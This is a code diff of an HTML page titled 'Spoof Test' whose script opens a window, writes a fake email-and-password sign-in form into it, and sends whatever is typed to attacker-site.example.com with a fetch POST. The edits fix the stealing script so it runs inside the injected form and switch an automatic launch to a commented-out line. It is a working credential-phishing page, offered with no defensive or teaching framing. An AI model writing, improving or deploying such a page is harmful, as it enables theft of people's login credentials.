@@ -1,7 +1,10 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Spoof Test</title>
+  </head>
   <body>
-    <button onclick="spoof()">Click to spoofff</button>
+    <button onclick="spoof()">Click to spoof</button>
 
     <script>
       function spoof() {
@@ -17,28 +20,26 @@
               <input id="email" type="email" placeholder="Email" style="margin:5px;padding:10px;width:250px;" />
               <input id="pass" type="password" placeholder="Password" style="margin:5px;padding:10px;width:250px;" />
               <button onclick="sendCreds()" style="margin-top:15px;padding:10px 20px;">Sign In</button>
+              <script>
+                function sendCreds() {
+                  let email = document.getElementById('email').value;
+                  let pass = document.getElementById('pass').value;
+                  fetch('https://attacker-site.example.com/log', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ email, pass })
+                  });
+                  alert("Logging in...");
+                }
+              <\/script>
             </div>
-            <script>
-              function sendCreds() {
-                let email = document.getElementById('email').value;
-                let pass = document.getElementById('pass').value;
-                fetch('https://attacker-site.example.com/log', {
-                  method: 'POST',
-                  headers: {'Content-Type': 'application/json'},
-                  body: JSON.stringify({ email, pass })
-                });
-                alert("Logging in...");
-              }
-            </script>
           `;
 
-          // Ganti isi window yang baru dibuka dengan HTML palsu
           win.document.write(fakeLogin);
         }, 3000);
       }
 
-      // Auto-run saat halaman dibuka (jika ingin otomatis, tidak perlu klik tombol)
-      spoof();
+      // spoof(); // Uncomment jika ingin otomatis jalan tanpa klik
     </script>
   </body>
 </html>
